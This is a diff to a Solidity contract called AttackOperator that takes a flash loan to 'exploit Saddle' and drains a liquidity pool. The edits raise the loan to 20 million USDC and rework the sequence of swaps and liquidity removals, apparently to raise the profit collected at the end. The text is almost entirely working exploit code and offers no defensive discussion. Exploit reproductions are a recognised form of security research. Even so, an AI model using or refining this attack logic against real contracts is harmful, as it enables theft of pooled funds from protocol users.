@@ -82,7 +82,7 @@ contract AttackOperator {
 
         // 1. call flash swap to exploit Saddle
         bytes memory emptyBytes;
-        EURLER.flashLoan(address(this), address(USDC), 15_000_000e6, emptyBytes);
+        EURLER.flashLoan(address(this), address(USDC), 20_000_000e6, emptyBytes);
 
         // 2. convert the profit into ETH
         uint256 usdcProfit = USDC.balanceOf(address(this));
@@ -115,31 +115,29 @@ contract AttackOperator {
 
         // Exploit Saddle
 
-        uint susd = crossSwapInSaddle(14_800_000e18);
+        uint susd = crossSwapInSaddle(18_000_000e18);
 
-        susd = crossSwapInSaddle(14_800_000e18);
+        removeLiquidity(7_000_000e18);
 
-        susd = crossSwapInSaddle(10_800_000e18);
+        crossSwapInSaddle(10_000_000e18);
 
-        removeLiquidity(6_000_000e18);
+        removeLiquidity(1_500_000e18);
 
-        susd = crossSwapInSaddle(11_000_000e18);
+        crossSwapInSaddle(7_000_000e18);
 
-        susd = crossSwapInSaddle(9_000_000e18);
+        removeLiquidity(300_000e18);
 
-        removeLiquidity(3_000_000e18);
+        crossSwapInSaddle(1_800_000e18);
 
-        susd = crossSwapInSaddle(9_000_000e18);
+        removeLiquidity(200_000e18);
 
-        susd = crossSwapInSaddle(2_200_000e18);
+        crossSwapInSaddle(1_370_000e18);
 
-        removeLiquidity(700_000e18);
+        removeLiquidity(100_000e18);
 
-        susd = crossSwapInSaddle(2_200_000e18);
+        crossSwapInSaddle(720_000e18);
 
-        susd = crossSwapInSaddle(800_000e18);
 
-        susd = crossSwapInSaddle(600_000e18);
 
 
         // COLLECT MONEY
